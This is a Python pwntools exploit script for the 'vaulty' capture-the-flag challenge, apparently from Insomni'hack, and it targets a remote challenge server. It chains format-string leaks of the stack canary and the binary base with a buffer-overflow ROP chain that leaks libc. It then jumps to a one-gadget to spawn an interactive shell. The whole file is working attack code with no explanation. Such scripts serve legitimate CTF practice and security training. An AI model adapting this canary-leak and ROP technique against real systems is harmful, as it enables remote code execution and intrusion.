#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF('/home/user/Desktop/ctf/pwn/vaulty/vaulty')
# context.log_level = "DEBUG"
rop = ROP(elf)
libc = ELF('./libc.so.6')
rop_libc = ROP(libc)
#p = process(
#    ['/home/user/Desktop/ctf/pwn/vaulty/ld-linux-x86-64.so.2',
#     '/home/user/Desktop/ctf/pwn/vaulty/vaulty'], 
#    env={"LD_LIBRARY_PATH":"/home/user/Desktop/ctf/pwn/vaulty"})
#gdb.attach(p, gdbscript='')
p = remote('vaulty.insomnihack.ch', 4556)

# LEAK CANARY
print(p.recv().decode(errors='ignore'))
p.sendline(b'1')

print(p.recv().decode(errors='ignore'))
p.sendline(b'%11$p')

print(p.recv().decode(errors='ignore'))
p.sendline(b'b')

print(p.recv().decode(errors='ignore'))
p.sendline(b'c')

print(p.recv().decode(errors='ignore'))
p.sendline(b'4')

print(p.recv().decode(errors='ignore'))
p.sendline(b'0')

resp = p.recvuntil(b'Menu')
print(resp)
canary = int(resp[resp.find(b'Username:')+10:resp.find(b'Pass')-1], 16)

print(f"CANARY LEAKED: {hex(canary)}")

# LEAK BASE ADDRESS
p.sendline(b'1')

print(p.recv().decode(errors='ignore'))
p.sendline(b'%13$p')

print(p.recv().decode(errors='ignore'))
p.sendline(b'b')

print(p.recv().decode(errors='ignore'))
p.sendline(b'c')

print(p.recv().decode(errors='ignore'))
p.sendline(b'4')

print(p.recv().decode(errors='ignore'))
p.sendline(b'1')

resp = p.recvuntil(b'Menu')
resp = p.recvuntil(b'Menu')
print(resp)
base_addr = int(resp[resp.find(b'Username:')+10:resp.find(b'Pass')-1], 16) - 6532

print(f"BASE LEAKED: {hex(base_addr)}")

puts_addr = base_addr + 4160
print(f"PUTS@PLT ADDR: {hex(puts_addr)}")


payload = b'A' * 40
payload += p64(canary)
payload += b'B' * 24
payload += p64(rop.find_gadget(['pop rdx', 'ret']).address + base_addr)
payload += p64(base_addr + 0x4008)
payload += p64(0x00000000000019c6 + base_addr)
payload += p64(puts_addr)
payload += p64(base_addr + 0x1894)
# control rax, rdx, rdi, rbp, rbx

p.sendline(b'1')

print(p.recv().decode(errors='ignore'))
p.sendline(b'A')

print(p.recv().decode(errors='ignore'))
p.sendline(b'B')

print(p.recv().decode(errors='ignore'))
p.sendline(payload)

resp = p.recvuntil(b'Menu')
print(resp)
libc_addr = u64(resp.split(b'\n')[3].ljust(8, b'\00')) - 527952
print(f"LIBC LEAKED: {hex(libc_addr)}")

bin_sh = next(libc.search(b'/bin/sh')) + libc_addr

payload = b'A' * 40
payload += p64(canary)
payload += b'B' * 24
payload += p64(rop_libc.find_gadget(['pop rbp', 'ret']).address + libc_addr)
payload += p64(elf.bss() + base_addr+0x200)
payload += p64(0xebd43+libc_addr)


p.sendline(b'1')

print(p.recv().decode(errors='ignore'))
p.sendline(b'A')

print(p.recv().decode(errors='ignore'))
p.sendline(b'B')

print(p.recv().decode(errors='ignore'))
p.sendline(payload)
p.interactive()
